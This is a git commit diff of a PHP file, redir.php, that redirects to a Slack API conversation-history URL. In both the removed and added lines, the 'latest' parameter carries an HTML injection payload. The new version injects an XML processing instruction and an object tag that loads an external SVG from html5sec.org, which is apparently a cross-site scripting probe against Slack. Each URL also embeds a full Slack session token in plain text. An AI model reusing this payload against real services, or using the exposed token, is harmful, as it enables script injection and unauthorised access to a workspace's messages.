52c8f46aa236832f47c6fbe0fa22d27dc426234c
missoum1307 <missoum1307@users.noreply.github.com>
2018-01-23 23:53:12 +0100

    Update redir.php

--- redir.php
+++ redir.php
@@ -1,4 +1,4 @@
 <?php
-header('location: https://hackone.slack.com/api/conversations.history?_x_id=778c508a-1516744884.811&channel=C8B29PKL7&limit=42&ignore_replies=true&include_pin_count=true&inclusive=true&no_user_profile=true&latest=1512491510.000125%3Ca%20href=x%3Exsqq&token=xoxs-272293041936-272872958131-272293052992-6019a3cfd8&visible=1');
+header('location: https://hackone.slack.com/api/conversations.history?_x_id=778c508a-1516744884.811&channel=C8B29PKL7&limit=42&ignore_replies=true&include_pin_count=true&inclusive=true&no_user_profile=true&latest=1512491510.000125%3C?PXML%3E%3Chtml:object%20data=https:\html5sec.org\test.svg%3Esqq&token=xoxs-272293041936-272872958131-272293052992-6019a3cfd8&visible=1');
 
 ?>
